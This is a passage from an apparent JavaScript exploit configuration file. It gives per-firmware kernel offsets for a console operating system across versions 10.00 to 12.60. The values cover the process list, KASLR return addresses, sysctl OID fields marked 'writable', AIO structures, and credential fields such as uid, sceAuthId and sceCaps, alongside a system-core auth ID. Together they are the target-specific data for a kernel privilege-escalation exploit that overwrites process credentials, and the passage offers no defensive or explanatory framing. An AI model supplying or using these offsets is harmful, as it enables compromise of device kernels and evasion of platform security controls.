        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "10.00": {
        kernelData: 0x00CC0000n, allproc: 0x03425D70n, rootvnode: 0x03C63510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00ADF87Fn, retLow16: 0xF87Fn },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x027A8138n, kind: 0x027A814Cn, kindByte3: 0x027A814Fn, arg1: 0x027A8150n, arg1Byte1: 0x027A8151n, arg1Value: 0x027A8128n, deadSink: 0x027A8158n },
            b: { base: 0x027A8010n, kind: 0x027A8024n, kindByte3: 0x027A8027n, arg1: 0x027A8028n, arg1Value: 0x027A7F40n, visible: 0x027A8060n },
            c: { base: 0x02ACADD8n, kind: 0x02ACADECn, arg1: 0x02ACADF0n, arg1Value: 0x03BE307Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03BE3078n, mib: [9, 7] },
        nodeMutex: 0x01A78978n,
        rodataProbe: { rva: 0x0112DAE5n, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c40n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "10.01": {
        kernelData: 0x00CC0000n, allproc: 0x03425D70n, rootvnode: 0x03C63510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00ADF87Fn, retLow16: 0xF87Fn },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x027A8138n, kind: 0x027A814Cn, kindByte3: 0x027A814Fn, arg1: 0x027A8150n, arg1Byte1: 0x027A8151n, arg1Value: 0x027A8128n, deadSink: 0x027A8158n },
            b: { base: 0x027A8010n, kind: 0x027A8024n, kindByte3: 0x027A8027n, arg1: 0x027A8028n, arg1Value: 0x027A7F40n, visible: 0x027A8060n },
            c: { base: 0x02ACADD8n, kind: 0x02ACADECn, arg1: 0x02ACADF0n, arg1Value: 0x03BE307Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03BE3078n, mib: [9, 7] },
        nodeMutex: 0x01A78978n,
        rodataProbe: { rva: 0x0112DB73n, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c40n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "10.20": {
        kernelData: 0x00CC0000n, allproc: 0x03425D70n, rootvnode: 0x03C63510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00ADFA9Fn, retLow16: 0xFA9Fn },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x027A8138n, kind: 0x027A814Cn, kindByte3: 0x027A814Fn, arg1: 0x027A8150n, arg1Byte1: 0x027A8151n, arg1Value: 0x027A8128n, deadSink: 0x027A8158n },
            b: { base: 0x027A8010n, kind: 0x027A8024n, kindByte3: 0x027A8027n, arg1: 0x027A8028n, arg1Value: 0x027A7F40n, visible: 0x027A8060n },
            c: { base: 0x02ACADD8n, kind: 0x02ACADECn, arg1: 0x02ACADF0n, arg1Value: 0x03BE307Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03BE3078n, mib: [9, 7] },
        nodeMutex: 0x01A78978n,
        rodataProbe: { rva: 0x0112DAF5n, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c40n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "10.40": {
        kernelData: 0x00CC0000n, allproc: 0x03425D70n, rootvnode: 0x03C63510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00ADFA9Fn, retLow16: 0xFA9Fn },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x027A8138n, kind: 0x027A814Cn, kindByte3: 0x027A814Fn, arg1: 0x027A8150n, arg1Byte1: 0x027A8151n, arg1Value: 0x027A8128n, deadSink: 0x027A8158n },
            b: { base: 0x027A8010n, kind: 0x027A8024n, kindByte3: 0x027A8027n, arg1: 0x027A8028n, arg1Value: 0x027A7F40n, visible: 0x027A8060n },
            c: { base: 0x02ACADD8n, kind: 0x02ACADECn, arg1: 0x02ACADF0n, arg1Value: 0x03BE307Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03BE3078n, mib: [9, 7] },
        nodeMutex: 0x01A78978n,
        rodataProbe: { rva: 0x0112DB1Fn, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c40n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "10.60": {
        kernelData: 0x00CC0000n, allproc: 0x03425D70n, rootvnode: 0x03C63510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00ADFA7Fn, retLow16: 0xFA7Fn },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x027A8138n, kind: 0x027A814Cn, kindByte3: 0x027A814Fn, arg1: 0x027A8150n, arg1Byte1: 0x027A8151n, arg1Value: 0x027A8128n, deadSink: 0x027A8158n },
            b: { base: 0x027A8010n, kind: 0x027A8024n, kindByte3: 0x027A8027n, arg1: 0x027A8028n, arg1Value: 0x027A7F40n, visible: 0x027A8060n },
            c: { base: 0x02ACADD8n, kind: 0x02ACADECn, arg1: 0x02ACADF0n, arg1Value: 0x03BE307Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03BE3078n, mib: [9, 7] },
        nodeMutex: 0x01A78978n,
        rodataProbe: { rva: 0x0112D569n, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c40n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "11.00": {
        kernelData: 0x00D30000n, allproc: 0x035A5D70n, rootvnode: 0x03DE7510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00B52B61n, retLow16: 0x2B61n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x02929E58n, kind: 0x02929E6Cn, kindByte3: 0x02929E6Fn, arg1: 0x02929E70n, arg1Byte1: 0x02929E71n, arg1Value: 0x02929E48n, deadSink: 0x02929E78n },
            b: { base: 0x02929D30n, kind: 0x02929D44n, kindByte3: 0x02929D47n, arg1: 0x02929D48n, arg1Value: 0x02929C60n, visible: 0x02929D80n },
            c: { base: 0x02C4CB18n, kind: 0x02C4CB2Cn, arg1: 0x02C4CB30n, arg1Value: 0x03D670BCn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03D670B8n, mib: [9, 7] },
        nodeMutex: 0x01AF9F18n,
        rodataProbe: { rva: 0x011A7ABAn, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c40n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "11.20": {
        kernelData: 0x00D30000n, allproc: 0x035A5D70n, rootvnode: 0x03DE7510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00B52B61n, retLow16: 0x2B61n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x02929E58n, kind: 0x02929E6Cn, kindByte3: 0x02929E6Fn, arg1: 0x02929E70n, arg1Byte1: 0x02929E71n, arg1Value: 0x02929E48n, deadSink: 0x02929E78n },
            b: { base: 0x02929D30n, kind: 0x02929D44n, kindByte3: 0x02929D47n, arg1: 0x02929D48n, arg1Value: 0x02929C60n, visible: 0x02929D80n },
            c: { base: 0x02C4CB18n, kind: 0x02C4CB2Cn, arg1: 0x02C4CB30n, arg1Value: 0x03D670BCn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03D670B8n, mib: [9, 7] },
        nodeMutex: 0x01AF9F18n,
        rodataProbe: { rva: 0x011A7625n, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c40n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "11.40": {
        kernelData: 0x00d30000n, allproc: 0x035a5d70n, rootvnode: 0x03de7510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00b53751n, retLow16: 0x3751n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x02929e90n, kind: 0x02929eacn, kindByte3: 0x02929eafn, arg1: 0x02929eb0n, arg1Byte1: 0x02929eb1n, arg1Value: 0x02929e88n, deadSink: 0x02929eb8n },
            b: { base: 0x02929d68n, kind: 0x02929d84n, kindByte3: 0x02929d87n, arg1: 0x02929d88n, arg1Value: 0x02929ca0n, visible: 0x02929dc0n },
            c: { base: 0x02c4cb50n, kind: 0x02c4cb6cn, arg1: 0x02c4cb70n, arg1Value: 0x03d670bcn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03d670b8n, mib: [9, 7] },
        nodeMutex: 0x035686d0n,
        rodataProbe: { rva: 0x011a7c0en, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0xc40n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "11.60": {
        kernelData: 0x00d30000n, allproc: 0x035a5d70n, rootvnode: 0x03de7510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00b53301n, retLow16: 0x3301n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x02929ed0n, kind: 0x02929eecn, kindByte3: 0x02929eefn, arg1: 0x02929ef0n, arg1Byte1: 0x02929ef1n, arg1Value: 0x02929ec8n, deadSink: 0x02929ef8n },
            b: { base: 0x02929da8n, kind: 0x02929dc4n, kindByte3: 0x02929dc7n, arg1: 0x02929dc8n, arg1Value: 0x02929ce0n, visible: 0x02929e00n },
            c: { base: 0x02c4cb90n, kind: 0x02c4cbacn, arg1: 0x02c4cbb0n, arg1Value: 0x03d670bcn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03d670b8n, mib: [9, 7] },
        nodeMutex: 0x03b77e20n,
        rodataProbe: { rva: 0x011a7987n, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0xc40n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "12.00": {
        kernelData: 0x00D50000n, allproc: 0x035D5E00n, rootvnode: 0x03E27510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00B6EC71n, retLow16: 0xEC71n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x0294b408n, kind: 0x0294b41cn, kindByte3: 0x0294b41fn, arg1: 0x0294b420n, arg1Byte1: 0x0294b421n, arg1Value: 0x0294b3f8n, deadSink: 0x0294b428n },
            b: { base: 0x0294b2e0n, kind: 0x0294b2f4n, kindByte3: 0x0294b2f7n, arg1: 0x0294b2f8n, arg1Value: 0x0294b210n, visible: 0x0294b330n },
            c: { base: 0x02c6e108n, kind: 0x02c6e11cn, arg1: 0x02c6e120n, arg1Value: 0x03da32bcn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03da32b8n, mib: [9, 7] },
        nodeMutex: 0x01b4dd78n,
        rodataProbe: { rva: 0x011c8f51n, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c48n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "12.02": {
        kernelData: 0x00D50000n, allproc: 0x035D5E00n, rootvnode: 0x03E27510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00B6EC71n, retLow16: 0xEC71n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x0294B408n, kind: 0x0294B41Cn, kindByte3: 0x0294B41Fn, arg1: 0x0294B420n, arg1Byte1: 0x0294B421n, arg1Value: 0x0294B3F8n, deadSink: 0x0294B428n },
            b: { base: 0x0294B2E0n, kind: 0x0294B2F4n, kindByte3: 0x0294B2F7n, arg1: 0x0294B2F8n, arg1Value: 0x0294B210n, visible: 0x0294B330n },
            c: { base: 0x02C6E108n, kind: 0x02C6E11Cn, arg1: 0x02C6E120n, arg1Value: 0x03DA32BCn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03DA32B8n, mib: [9, 7] },
        nodeMutex: 0x01B1AB78n,
        rodataProbe: { rva: 0x011C8DA2n, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c48n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "12.20": {
        kernelData: 0x00D50000n, allproc: 0x035D5E00n, rootvnode: 0x03E27510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00B6EAF1n, retLow16: 0xEAF1n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x0294B408n, kind: 0x0294B41Cn, kindByte3: 0x0294B41Fn, arg1: 0x0294B420n, arg1Byte1: 0x0294B421n, arg1Value: 0x0294B3F8n, deadSink: 0x0294B428n },
            b: { base: 0x0294B2E0n, kind: 0x0294B2F4n, kindByte3: 0x0294B2F7n, arg1: 0x0294B2F8n, arg1Value: 0x0294B210n, visible: 0x0294B330n },
            c: { base: 0x02C6E108n, kind: 0x02C6E11Cn, arg1: 0x02C6E120n, arg1Value: 0x03DA32BCn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03DA32B8n, mib: [9, 7] },
        nodeMutex: 0x01B1AB78n,
        rodataProbe: { rva: 0x011C9013n, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c48n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "12.40": {
        kernelData: 0x00D50000n, allproc: 0x035D5E00n, rootvnode: 0x03E27510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00B6EAF1n, retLow16: 0xEAF1n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x0294B408n, kind: 0x0294B41Cn, kindByte3: 0x0294B41Fn, arg1: 0x0294B420n, arg1Byte1: 0x0294B421n, arg1Value: 0x0294B3F8n, deadSink: 0x0294B428n },
            b: { base: 0x0294B2E0n, kind: 0x0294B2F4n, kindByte3: 0x0294B2F7n, arg1: 0x0294B2F8n, arg1Value: 0x0294B210n, visible: 0x0294B330n },
            c: { base: 0x02C6E108n, kind: 0x02C6E11Cn, arg1: 0x02C6E120n, arg1Value: 0x03DA32BCn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03DA32B8n, mib: [9, 7] },
        nodeMutex: 0x01B1AB78n,
        rodataProbe: { rva: 0x011C8E15n, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c48n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "12.60": {
        kernelData: 0x00D50000n, allproc: 0x035D5E00n, rootvnode: 0x03E27510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00B6EB51n, retLow16: 0xEB51n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x0294B408n, kind: 0x0294B41Cn, kindByte3: 0x0294B41Fn, arg1: 0x0294B420n, arg1Byte1: 0x0294B421n, arg1Value: 0x0294B3F8n, deadSink: 0x0294B428n },
            b: { base: 0x0294B2E0n, kind: 0x0294B2F4n, kindByte3: 0x0294B2F7n, arg1: 0x0294B2F8n, arg1Value: 0x0294B210n, visible: 0x0294B330n },
            c: { base: 0x02C6E108n, kind: 0x02C6E11Cn, arg1: 0x02C6E120n, arg1Value: 0x03DA32BCn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03DA32B8n, mib: [9, 7] },
        nodeMutex: 0x01B1AB78n,
        rodataProbe: { rva: 0x011C8E92n, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c48n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
